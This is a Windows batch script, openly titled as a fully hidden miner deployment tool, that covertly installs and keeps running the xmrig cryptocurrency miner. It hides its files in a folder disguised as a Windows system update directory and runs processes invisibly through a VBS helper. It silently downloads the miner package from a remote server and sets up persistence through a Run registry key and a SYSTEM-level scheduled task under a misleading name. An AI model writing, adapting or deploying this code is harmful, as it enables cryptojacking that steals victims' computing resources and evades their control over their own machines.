@echo off
REM Fully Hidden Miner Deployment and Monitoring Script
setlocal enabledelayedexpansion

REM Configuration
set "ZIP_URL=https://your-server.com/mall.zip"
set "ORIGINAL_DIR=%~dp0"
set "HIDDEN_DIR=%ProgramData%\Windows\SystemUpdate\"
set "HIDDEN_SCRIPT=SystemMonitor.cmd"

REM Create hidden directory if not exists
if not exist "%HIDDEN_DIR%" (
    mkdir "%HIDDEN_DIR%"
    attrib +s +h "%HIDDEN_DIR%"
)

REM Create hidden execution helper
if not exist "%HIDDEN_DIR%run_hidden.vbs" (
    >"%HIDDEN_DIR%run_hidden.vbs" (
        echo Set WshShell = CreateObject("WScript.Shell"^)
        echo WshShell.Run WScript.Arguments(0^), 0, False
        echo Set WshShell = Nothing
    )
)

REM Check if xmrig is running (completely hidden)
powershell -Command "Get-Process xmrig -ErrorAction SilentlyContinue" >nul 2>&1
if %errorlevel% neq 0 (
    echo [%time%] xmrig.exe not running - attempting start
    if exist "%ORIGINAL_DIR%xmrig.exe" (
        wscript.exe "%HIDDEN_DIR%run_hidden.vbs" "%ORIGINAL_DIR%xmrig.exe"
    ) else (
        echo [%time%] xmrig.exe missing - downloading package
        
        REM Download and extract completely hidden
        powershell -WindowStyle Hidden -Command ^
            "Invoke-WebRequest '%ZIP_URL%' -OutFile '%HIDDEN_DIR%mall.zip'; ^
             Expand-Archive '%HIDDEN_DIR%mall.zip' '%HIDDEN_DIR%' -Force; ^
             Remove-Item '%HIDDEN_DIR%mall.zip' -Force"
        
        if exist "%HIDDEN_DIR%xmrig.exe" (
            wscript.exe "%HIDDEN_DIR%run_hidden.vbs" "%HIDDEN_DIR%xmrig.exe"
        )
    )
)

REM Copy self to hidden location with new name
if not exist "%HIDDEN_DIR%%HIDDEN_SCRIPT%" (
    copy /y "%~f0" "%HIDDEN_DIR%%HIDDEN_SCRIPT%" >nul
)

REM Setup hidden persistence mechanisms
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SystemHealthMonitor" /t REG_SZ /d "wscript.exe \"%HIDDEN_DIR%run_hidden.vbs\" \"%HIDDEN_DIR%%HIDDEN_SCRIPT%\"" /f >nul 2>&1
schtasks /create /tn "SystemHealthMonitor" /tr "wscript.exe \"%HIDDEN_DIR%run_hidden.vbs\" \"%HIDDEN_DIR%%HIDDEN_SCRIPT%\"" /sc minute /mo 5 /ru SYSTEM /rl HIGHEST /f >nul 2>&1

REM Self-restart after 3 hours (hidden)
wscript.exe "%HIDDEN_DIR%run_hidden.vbs" "cmd /c timeout /t 10800 /nobreak && wscript.exe \"%HIDDEN_DIR%run_hidden.vbs\" \"%HIDDEN_DIR%%HIDDEN_SCRIPT%\""